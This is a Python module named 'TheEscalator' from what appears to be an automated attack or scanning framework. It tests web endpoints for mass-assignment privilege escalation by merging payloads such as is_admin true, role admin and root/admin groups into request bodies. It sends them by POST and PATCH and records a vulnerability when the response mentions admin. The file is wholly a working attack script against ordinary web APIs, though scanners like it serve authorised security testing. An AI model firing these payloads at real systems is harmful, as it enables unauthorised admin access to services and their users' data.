import aiohttp
from backend.core.base import BaseArsenalModule
from backend.core.protocol import JobPacket, ResultPacket, Vulnerability

class TheEscalator(BaseArsenalModule):
    """
    MODULE: THE ESCALATOR
    Logic: Privilege Escalation (Mass Assignment).
    Cyber-Organism Protocol: Dictionary Merging & JSON Patching.
    """
    async def execute(self, packet: JobPacket) -> ResultPacket:
        target = packet.target
        vulns = []
        
        # Payloads for dictionary merging
        payloads = [
            {"is_admin": True},
            {"role": "admin"},
            {"groups": ["root", "admin"]},
            {"permissions": "ALL"}
        ]
        
        async with aiohttp.ClientSession() as session:
            for vector in payloads:
                # strategy: Merge with original payload
                merged_payload = target.payload.copy() if target.payload else {}
                merged_payload.update(vector)
                
                # 1. POST Attempt
                async with session.post(target.url, json=merged_payload, headers=target.headers) as resp:
                    if resp.status == 200:
                        body = await resp.text()
                        if "admin" in body.lower():
                            vulns.append(Vulnerability(name="Mass Assignment (POST)", severity="HIGH", description=f"Accepted {vector}"))

                # 2. PATCH Attempt (Cyber-Organism Protocol)
                async with session.patch(target.url, json=merged_payload, headers=target.headers) as resp:
                    if resp.status == 200:
                         body = await resp.text()
                         if "admin" in body.lower():
                             vulns.append(Vulnerability(name="Mass Assignment (PATCH)", severity="CRITICAL", description=f"Accepted {vector} via PATCH"))

        return ResultPacket(
            job_id=packet.id,
            source_agent=packet.config.agent_id,
            status="VULN_FOUND" if vulns else "SUCCESS",
            execution_time_ms=0,
            vulnerabilities=vulns
        )
